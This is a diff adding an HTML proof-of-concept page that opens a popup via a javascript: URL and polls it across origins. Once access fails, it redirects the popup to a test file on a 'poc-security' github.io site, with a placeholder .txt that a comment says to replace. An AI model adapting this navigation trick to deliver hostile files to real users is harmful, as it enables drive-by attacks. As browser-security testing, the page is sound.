@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+function next() {
+  // Ganti dengan file test kamu (pakai .txt dulu untuk safety)
+  w.location.replace('https://nuribnuu.github.io/poc-security/test.txt');
+}
+
+function f() {
+  w = window.open("javascript:document.write('<h1>Test</h1>');location='https://www.google.com'");
+  i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
+}
+</script>
+</head>
+<body>
+  <button onclick="f()">Test PoC</button>
+</body>
+</html>
